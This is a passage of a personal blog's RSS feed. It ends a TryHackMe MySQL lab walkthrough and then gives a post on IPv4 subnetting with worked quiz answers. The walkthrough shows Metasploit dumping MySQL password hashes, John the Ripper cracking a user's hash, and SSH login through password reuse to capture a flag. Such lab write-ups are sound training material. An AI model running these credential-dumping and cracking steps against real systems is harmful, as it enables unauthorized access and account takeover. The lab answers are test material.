</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>RPORT <span style="color:#fab387">3306</span> yes The target port <span style="color:#89dceb;font-weight:bold">(</span>TCP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>THREADS <span style="color:#fab387">1</span> yes The number of concurrent threads <span style="color:#89dceb;font-weight:bold">(</span>max one per host<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>USERNAME no The username to authenticate as
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>View the full module info with the info, or info -d command.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_hashdump<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> USERNAME root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span><span style="color:#f5e0dc">USERNAME</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; root
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_hashdump<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> RHOSTS 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span><span style="color:#f5e0dc">RHOSTS</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_hashdump<span style="color:#89dceb;font-weight:bold">)</span> &gt; <span style="color:#89dceb">set</span> PASSWORD password
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span><span style="color:#f5e0dc">PASSWORD</span> <span style="color:#89dceb;font-weight:bold">=</span>&gt; password</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>msf6 auxiliary<span style="color:#89dceb;font-weight:bold">(</span>scanner/mysql/mysql_hashdump<span style="color:#89dceb;font-weight:bold">)</span> &gt; run
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Saving HashString as Loot: root:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Saving HashString as Loot: carl:_EA031893AA21444B170FC2162A56978B8CEECE18
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#89dceb;font-weight:bold">[</span>_<span style="color:#89dceb;font-weight:bold">]</span> 10.10.151.196:3306 - Scanned <span style="color:#fab387">1</span> of <span style="color:#fab387">1</span> hosts <span style="color:#89dceb;font-weight:bold">(</span>100% <span style="color:#89dceb">complete</span><span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb;font-weight:bold">[</span>*<span style="color:#89dceb;font-weight:bold">]</span> Auxiliary module execution completed</span></span></code></pre></div>
<br>
<p>Another user! And we have their password hash. This could be very interesting. Copy the hash string in full, like: bob:*HASH to a text file on your local machine called &ldquo;hash.txt&rdquo;.
What is the user/hash combination string?</p>






<pre tabindex="0"><code>carl:*EA031893AA21444B170FC2162A56978B8CEECE18</code></pre>
<br>
<p>Now, we need to crack the password! Let&rsquo;s try <code>John the Ripper</code> against it using: <code>john hash.txt</code>. What is the password of the user we found?</p>






<pre tabindex="0"><code>doggie</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# cat &gt; hash.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>carl:*EA031893AA21444B170FC2162A56978B8CEECE18
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>root@ip-10-10-35-22:~# cat hash.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>carl:*EA031893AA21444B170FC2162A56978B8CEECE18
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>root@ip-10-10-35-22:~# john hash.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Warning: detected <span style="color:#89dceb">hash</span> <span style="color:#89dceb">type</span> <span style="color:#a6e3a1">&#34;mysql-sha1&#34;</span>, but the string is also recognized as <span style="color:#a6e3a1">&#34;mysql-sha1-opencl&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>Use the <span style="color:#a6e3a1">&#34;--format=mysql-sha1-opencl&#34;</span> option to force loading these as that <span style="color:#89dceb">type</span> instead
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>Using default input encoding: UTF-8
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Loaded <span style="color:#fab387">1</span> password <span style="color:#89dceb">hash</span> <span style="color:#89dceb;font-weight:bold">(</span>mysql-sha1, MySQL 4.1+ <span style="color:#89dceb;font-weight:bold">[</span>SHA1 256/256 AVX2 8x<span style="color:#89dceb;font-weight:bold">])</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Warning: no OpenMP support <span style="color:#cba6f7">for</span> this <span style="color:#89dceb">hash</span> type, consider --fork<span style="color:#89dceb;font-weight:bold">=</span><span style="color:#fab387">2</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Proceeding with single, rules:Single
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Press <span style="color:#a6e3a1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#cba6f7">for</span> status
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Warning: Only <span style="color:#fab387">2</span> candidates buffered <span style="color:#cba6f7">for</span> the current salt, minimum <span style="color:#fab387">8</span> needed <span style="color:#cba6f7">for</span> performance.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>Almost <span style="color:#cba6f7">done</span>: Processing the remaining buffered candidate passwords, <span style="color:#cba6f7">if</span> any.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Proceeding with wordlist:/opt/john/password.lst
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>Proceeding with incremental:ASCII
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>doggie <span style="color:#89dceb;font-weight:bold">(</span>carl<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>1g 0:00:00:01 DONE 3/3 <span style="color:#89dceb;font-weight:bold">(</span>2024-06-26 06:01<span style="color:#89dceb;font-weight:bold">)</span> 0.5291g/s 1209Kp/s 1209Kc/s 1209KC/s doggie..doggia
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>Use the <span style="color:#a6e3a1">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>Session completed.</span></span></code></pre></div>
<br>
<p>Awesome. Password reuse is not only extremely dangerous, but extremely common. What are the chances that this user has reused their password for a different service? What&rsquo;s the contents of MySQL.txt?</p>






<pre tabindex="0"><code>THM{congratulations_you_got_the_mySQL_flag}</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-35-22:~# ssh carl@10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>carl@10.10.151.196<span style="color:#f38ba8">&#39;</span>s password:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Welcome to Ubuntu 18.04.4 LTS <span style="color:#89dceb;font-weight:bold">(</span>GNU/Linux 4.15.0-96-generic x86_64<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>- Documentation: https://help.ubuntu.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>- Management: https://landscape.canonical.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>- Support: https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>System information as of Wed Jun <span style="color:#fab387">26</span> 05:04:05 UTC <span style="color:#fab387">2024</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>System load: 0.0 Processes: <span style="color:#fab387">87</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Usage of /: 41.7% of 9.78GB Users logged in: <span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Memory usage: 32% IP address <span style="color:#cba6f7">for</span> eth0: 10.10.151.196
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>Swap usage: 0%
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span><span style="color:#fab387">23</span> packages can be updated.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span><span style="color:#fab387">0</span> updates are security updates.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>Last login: Thu Apr <span style="color:#fab387">23</span> 12:57:41 <span style="color:#fab387">2020</span> from 192.168.1.110
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>carl@polomysql:~$ ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>MySQL.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>carl@polomysql:~$ cat MySQL.txt
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>THM<span style="color:#89dceb;font-weight:bold">{</span>congratulations_you_got_the_mySQL_flag<span style="color:#89dceb;font-weight:bold">}</span></span></span></code></pre></div>
]]></content:encoded>
    </item>
    <item>
      <title>[TIL] Subnetting 2</title>
      <link>http://localhost:1313/til-subnetting-2/</link>
      <pubDate>Wed, 26 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/til-subnetting-2/</guid>
      <description>Divide the 192.168.1.0/24 network into 4 subnets that can accommodate 45 number of hosts.
First, we determined that the prefix length needs to be /26 because each subnet must be able to include 45 hosts. The formula to calculate the number of hosts is 2^n - 2, where n is the number of host bits. If there are 5 host bits, then 2^5 - 2 = 30, which is not enough to include 45 hosts.</description>
      <content:encoded><![CDATA[<div style="text-align: center"><img src="./image-30.png"></div>
<p>Divide the <code>192.168.1.0/24</code> network into 4 subnets that can accommodate 45 number of hosts.</p>
<p>First, we determined that the prefix length needs to be <code>/26</code> because each subnet must be able to include 45 hosts. The formula to calculate the number of hosts is <code>2^n - 2</code>, where n is the number of host bits. If there are 5 host bits, then 2^5 - 2 = 30, which is not enough to include 45 hosts. Therefore, we need 2^6 - 2 = 62, which isn&rsquo;t exactly 45 but is sufficient. To accommodate 45 hosts, we need 6 host bits. This makes the prefix length /26, since we subtract the 6 host bits from the total address length of 32.</p>
<p>The network address of <code>subnet 1</code> is 192.168.1.0/26. To find the broadcast address of subnet 1, we first convert the subnet 1 address to binary:
<code>11000000.10101000.00000001.00000000</code></p>
<p>Then, we change all the Host ID bits to 1, leaving the Network ID bits unchanged:
<code>11000000.10101000.00000001.00111111</code></p>
<p>Converting these binary bits back to dotted decimal format gives us the broadcast address (the highest address in this subnet) of subnet 1.
<code>192.168.1.63/26</code>.</p>
<p>So, the address range of subnet1 is 192.168.1.0 - 192.168.1.63.</p>
<p>The network address of <code>subnet 2</code> will be 1 higher than the broadcast address of <code>subnet 1</code>. So, 192.168.1.64/26.</p>
<p>192.168.1.64 in binary is <code>11000000.10101000.00000001.01000000</code>.
Covert all the host bits to 1s. <code>11000000.10101000.00000001.01111111</code></p>
<p>Convert the binary bits back to dotted decimal and it becomes <code>192.168.1.127</code>.</p>
<p>The address range of subnet 2 is 192.168.1.64 to 192.168.1.127.</p>
<p>You might have noticed that each subnet is 64 bits apart. To find next subnet&rsquo;s network address, simply add this value to the current subnet.</p>
<p>Take the image below as an example.</p>
<div style="text-align: center"><img src="./image-31.png"></div>
<p>Let&rsquo;s just focus on the last octet here. The last octet in binary is <code>00000000</code>. The first 2 bits is the network ID, which we borrowed to expand the network ID and the last 6 bits is the host ID. The trick to find each subnet&rsquo;s network address is to remember the value of last bit of the network portion, which is 64, in this case.</p>
<br>
<br>
<br>
<div style="text-align: center"><img src="./image-32.png"></div>
For the number of subnets, each additional bit that you borrow doubles the number of subnets.
<h3 id="subnetting-class-b-networks">Subnetting Class B Networks</h3>
<ol>
<li>
<p>You have been given the 172.16.0.0/16 network. You are asked to create 80 subnets for your company&rsquo;s various LANs. What prefix length should you use?</p>
<p>2^x = number of subnets, where x is the number of &lsquo;borrowed&rsquo; bits.</p>
</li>
</ol>
<div style="text-align: center"><img src="./image-33.png"></div>
we have to borrow 7 bits. 16 + 7 = /23.
<ol start="2">
<li>You have been given the <code>172.22.0.0/16</code> network. You are required to divide the network into 500 separate subnets. What prefix should you use?</li>
</ol>
<p>First of all, looking at the /16 prefix length, it seems like subnetting needs to be done in a Class B network. To create 500 subnets, we need to determine how many bits to borrow.</p>
<p>2^8 is 256, and 2^9 is 512. Therefore, we need to borrow 9 bits. Starting from a Class B network, which has a /16 prefix length, we add 9 bits to get a /25 prefix length. This means we should use a /25 prefix length.</p>
<ol start="3">
<li>You have been given the <code>172.18.0.0/16</code> network. Your company requires 250 subnets with the same number of hosts per subnet. What prefix length should you use?</li>
</ol>
<p><code>/24</code> . 2^8 = 256 subnets could be made. Also /24 prefix length will leave 8, the number of host bits which could lead to 2^8 - 2, 254.</p>
<ol start="4">
<li>
<p>What subnet does host 172.25.217.192/21 belong to?</p>
<p>Let&rsquo;s convert <code>172.25.217.192</code> to binary bits.
10101100.00011001.11011001.11000000</p>
<p>change all of the host bits to 0.
10101100.00011001.11011000.00000000</p>
<p>change it back to dotted decimal.
172.25.216.0/21</p>
</li>
</ol>
<h3 id="quiz">Quiz</h3>
<hr>
<p>Q1. You have been given the <code>172.30.0.0/16</code> network. Your company requires 100 subnets with at least 500 hosts per subnet. What prefix length should you use?</p>






<pre tabindex="0"><code>/23</code></pre>
<br>
<p>Q2. What subnet does host <code>172.21.111.201/20</code> belong to?</p>






<pre tabindex="0"><code>172.21.96.0/20</code></pre>
<ul>
<li>Convert the address to binary: <code>10101100.00010101.01101111.11001001</code></li>
<li>Change the host bits to 0s. Since the prefix length is <code>/20</code> , we can set the last 12 bits to 0s: <code>10101100.00010101.01100000.00000000</code></li>
<li>Convert the binary bits back to dotted decimal: <code>172.21.96.0/20</code></li>
</ul>
<br>
<p>Q3. What is the broadcast address of the network 192.168.91.78/26 belongs to?</p>






<pre tabindex="0"><code>192.168.91.127/26</code></pre>
<ul>
<li>Convert the address to binary bits:
<ul>
<li><code>11000000.10101000.01011011.01001110</code>.</li>
</ul>
</li>
<li>Change all of the host bits to 0s to find the network address of the subnet:
<ul>
<li><code>11000000.10101000.01011011.01000000</code>.</li>
</ul>
</li>
<li>Change all of the host bits to 1s to find the broadcast address of the subnet:
<ul>
<li><code>11000000.10101000.01011011.01111111</code>.</li>
</ul>
</li>
<li>Change the binary bits back to dotted decimal
<ul>
<li>network address: 192.168.91.64/26</li>
<li>broadcast address: 192.168.91.127/26</li>
</ul>
</li>
</ul>
<br>
<p>Q4. You divide the <code>172.16.0.0/16</code> network into 4 subnets of equal size. Identify the network and broadcast addresses of the second subnet.</p>






<pre tabindex="0"><code>network address: 172.16.64.0/18
broadcast address: 172.16.127.255/18</code></pre>
<ul>
<li>The original subnet mask for a /16 network is 255.255.0.0.</li>
<li>Dividing into 4 subnets require 2 additional bits for subnetting (2^2 = 4).</li>
<li>This changes the subnet mask to 255.255.192.0 /18.</li>
<li>The original network 172.16.0.0/16 is divided as follows with a /18 mask:
<ul>
<li>subnet1: 172.16.0.0/18</li>
<li>subnet2: 172.16.64.0/18</li>
<li>subnet3: 172.16.128.0/18</li>
<li>subnet4: 172.16.192.0/18</li>
</ul>
</li>
<li>We know that subnet 2&rsquo;s broadcast address is just 1 below subnet 3&rsquo;s network address: 172.16.127.255/18</li>
</ul>
<br>
<p>Q5. You divide the 172.30.0.0/16 network into subnets of 1000 hosts each. How many subnets are you able to make?</p>






<pre tabindex="0"><code>64</code></pre>
<p>To divide the network into subnets that each accommodate 1,000 hosts, we first need to determine how many bits are required for the hosts. The formula for calculating the number of hosts is <code>2^n - 2</code>, where n is the number of host bits. If we use 10 bits for the hosts, we get 2^10 - 2 = 1,022 hosts, which is more than enough.</p>
<p>The maximum prefix length is /32. Subtracting the 10 host bits from 32 gives us a prefix length of /22. Therefore, the subnet mask of the subnets will be /22. The original subnet mask was /16, so we&rsquo;ve borrowed 6 bits from the original network for subnetting. With these 6 additional bits, we can create 64 (2^6) subnets.</p>
]]></content:encoded>
    </item>
  </channel>
</rss>
